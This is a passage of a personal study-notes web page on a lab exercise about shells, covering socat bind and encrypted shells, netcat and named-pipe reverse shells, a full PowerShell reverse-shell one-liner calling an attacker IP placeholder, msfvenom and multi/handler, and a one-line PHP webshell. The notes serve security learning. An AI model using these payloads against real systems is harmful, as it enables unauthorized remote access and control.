+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="gp"># </span>-<span class="w"> </span>pty:<span class="w"> </span>allocates<span class="w"> </span>a<span class="w"> </span>pseudo-terminal<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>target.
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="gp"># </span>-<span class="w"> </span>stderr:<span class="w"> </span>makes<span class="w"> </span>sure<span class="w"> </span>that<span class="w"> </span>any<span class="w"> </span>error<span class="w"> </span>messages<span class="w"> </span>get<span class="w"> </span>shown<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>shell.
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="gp"># </span>-<span class="w"> </span>sigint:<span class="w"> </span>passes<span class="w"> </span>any<span class="w"> </span>CTRL+C<span class="w"> </span>commands<span class="w"> </span>through<span class="w"> </span>into<span class="w"> </span>the<span class="w"> </span>sub-process.
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="gp"># </span>-<span class="w"> </span>setsid:<span class="w"> </span>creates<span class="w"> </span>the<span class="w"> </span>process<span class="w"> </span><span class="k">in</span><span class="w"> </span>a<span class="w"> </span>new<span class="w"> </span>session.
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="gp"># </span>-<span class="w"> </span>sane:<span class="w"> </span>stabilizes<span class="w"> </span>the<span class="w"> </span>terminal<span class="w"> </span>attempting<span class="w"> </span>to<span class="w"> </span><span class="s2">&quot;normalize&quot;</span><span class="w"> </span>it.
+</code></pre></div>
+<h3 id="bind-shells_1">Bind Shells<a class="headerlink" href="#bind-shells_1" title="Permanent link">&para;</a></h3>
+<p>On a Linux target, we would use the following command to create a bind shell:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="go">socat TCP-L:&lt;Port-Number&gt; EXEC:&quot;bash -li&quot;</span>
+</code></pre></div>
+On a Windows target, we would use the following command to create a bind shell:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="go">socat TCP-L:&lt;Port-Number&gt; EXEC:powershell.exe,pipes</span>
+</code></pre></div>
+Regardless of the target, we use the following command on the attacking machine to connect to the waiting listener:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="go">socat TCP:&lt;Target-IP&gt;:&lt;Target-Port&gt; -</span>
+</code></pre></div>
+<h2 id="task-7-socat-encrypted-shells">Task 7 - Socat Encrypted Shells<a class="headerlink" href="#task-7-socat-encrypted-shells" title="Permanent link">&para;</a></h2>
+<p>One of the many good things about Socat is that it's capable of creating both bind and reverse encrypted shells. To allow for encrypted shells, we first need to generate an SSL certificate. This can be done using OpenSSL which comes installed default on Linux machines with the following syntax:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="go">openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</span>
+</code></pre></div>
+This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for 362 days. When we run this command it will ask us to fill in information about the certificate. This can be left blank, or filled randomly.</p>
+<p>Now we need to merge the two files created by OpenSSL together into a single <code>.pem</code> file.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="go">cat shell.key shell.crt &gt; shell.pem</span>
+</code></pre></div>
+With the <code>.pem</code> file created, we can now set up our reverse shell listener with the following command:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="go">socat OPENSSL-LISTEN:&lt;Port-Number&gt;,cert=shell.pem,verify=0 -</span>
+</code></pre></div>
+This sets up an OPENSSL listener using our generated certificate. The <code>verify=0</code> tells the connection to not bother trying to validate if our certificate has been properly signed by a recognized authority.</p>
+<p>Note that the certificate must be used on whichever device is listening.</p>
+<p>To connect back (ie: payload), the following command can be used:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>socat OPENSSL:&lt;Attacker-IP&gt;:&lt;Attacker-Port&gt;,verify=0 EXEC:/bin/bash
+</code></pre></div>
+For bind shells, the same technique would apply:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="gp"># </span>Target<span class="w"> </span>Machine<span class="w"> </span><span class="o">(</span>Windows<span class="w"> </span>Example<span class="o">)</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="go">socat OPENSSL-LISTEN:&lt;Port-Number&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="gp"># </span>Attacker<span class="w"> </span>Machine
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="go">socat OPENSSL:&lt;Target-IP&gt;:&lt;Target-PORT&gt;,verify=0 -</span>
+</code></pre></div>
+Note that the certificate must be copied over to the target machine prior to creating a bind listener.</p>
+<h2 id="task-8-common-shell-payloads">Task 8 - Common Shell Payloads<a class="headerlink" href="#task-8-common-shell-payloads" title="Permanent link">&para;</a></h2>
+<p>This tasks covers some common payloads using the tools we have already discussed above.</p>
+<p>A simple Netcat payload can be made as follows:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="gp"># </span>Bind<span class="w"> </span>Shell<span class="w"> </span>Listener
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="go">nc -lvnp &lt;Port-Number&gt; -e /bin/bash</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="gp"># </span>Reverse<span class="w"> </span>Shell<span class="w"> </span>Payload
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="go">nc &lt;Attacker-IP&gt; &lt;Attacker-Port&gt; -e /bin/bash</span>
+</code></pre></div>
+If the target is not using <code>netcat-traditional</code> we will not be able to use the above commands. In this event the following commands using named pipes will prove useful:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="gp"># </span>Bind<span class="w"> </span>Shell<span class="w"> </span>Listener
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="go">mkfifo /tmp/f; nc -lvnp &lt;Port-Number&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="gp"># </span>Reverse<span class="w"> </span>Shell<span class="w"> </span>Payload
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="go">mkfifo /tmp/f; nc &lt;Attacker-IP&gt; &lt;Attacker-Port&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</span>
+</code></pre></div>
+When targeting Windows systems, a Powershell one liner can be very useful.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">powershell</span> <span class="n">-c</span> <span class="s2">&quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;&lt;Attacker-IP&gt;&#39;,&lt;Attacker-Port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</span>
+</code></pre></div>
+Multitude of payloads can be generated for both Linux and Windows at: <a href="https://www.revshells.com/">Reverse Shell Generator</a></p>
+<h2 id="task-9-msfvenom">Task 9 - Msfvenom<a class="headerlink" href="#task-9-msfvenom" title="Permanent link">&para;</a></h2>
+<p>Msvenom is considered the one-stop-shop for all things payload related. Being part of the Metasploit Framework, Msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hex shellcode when developing something like a Buffer Overflow exploit.</p>
+<p>The standard syntax for Msfvenom is as follows:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="go">msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</span>
+</code></pre></div>
+Various payloads can be listed using the command <code>--list-payloads</code>. All relevant options can be listed using the <code>-h</code> syntax.</p>
+<h3 id="staged-vs-stageless">Staged vs Stageless<a class="headerlink" href="#staged-vs-stageless" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Staged payloads</strong> are sent in two parts. The first part is called the <em>stager</em>. This is a piece of code which is executed directly on the target itself. It then connects back to a waiting listener and downloads the real payload; executing it in memory without the payload every touching the disk. Staged payloads require a special listener (usually multi/handler).</li>
+<li><strong>Stageless payloads</strong> are more common. These are self-contained in that there is only one piece of code which, when executed, sends a shell back immediately to the waiting listener.</li>
+</ul>
+<p>Stageless payloads tend to be easier to catch and use. They are larger in size and easier for an antivirus or IDS/IPS to discover and remove.</p>
+<p>Modern day antivirus solutions make use of the Anti-Malware Scan Interface (AMSI) to detect payloads as they are loaded into memory by a stager. This makes staged payloads less effective then they once were.</p>
+<h2 id="task-10-metasploit-multihandler">Task 10 - Metasploit multi/handler<a class="headerlink" href="#task-10-metasploit-multihandler" title="Permanent link">&para;</a></h2>
+<p>Multi/handler is an excellent tool for catching reverse shells. It is essential if you want to use Meterpreter shells.</p>
+<p>To use multi/handler, open Metasploit Framework using <code>msfvonsole</code> and type <code>use multi/handler</code>.</p>
+<p>multi/handler defaults to a <code>generic/shell_reverse_tcp</code> payload so depending on what payload was selected, this may need to be modified using the <code>set payload &lt;PAYLOAD&gt;</code> command. Listing options using the <code>options</code> command shows all the options (including the required options necessary for the module to function).</p>
+<h2 id="task-11-webshells">Task 11 - WebShells<a class="headerlink" href="#task-11-webshells" title="Permanent link">&para;</a></h2>
+<p>Webshell is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage (either through an HTML form or directly as arguments in the URL) which are then executed by the script. The results are returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.</p>
+<p>As PHP is still the most common server side scripting language, let's look at an example code for this.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span> <span class="o">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span>
+</code></pre></div>
+This will take a GET parameter in the URL and execute it on the system with <code>shell_exec()</code> command. Essentially, what this means is that any command we enter in the URL after <code>?cmd=</code> will be executed on the system. The "pre" elements are there to ensure that the results are formatted correctly on the page.</p>
+<h2 id="tasks-12-15">Tasks 12-15<a class="headerlink" href="#tasks-12-15" title="Permanent link">&para;</a></h2>
+<p>Tasks 12-15 cover practical hands-on practice of the different shell techniques discussed in this room.</p>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">November 27, 2024</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../vulnversity/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Vulnversity">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Vulnversity
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      &copy; 2024 Nouman Noor
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/nanoor" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://ca.linkedin.com/in/nouman-noor-60193727" target="_blank" rel="noopener" title="ca.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.annotate", "content.code.copy", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+    
+  </body>
+</html>
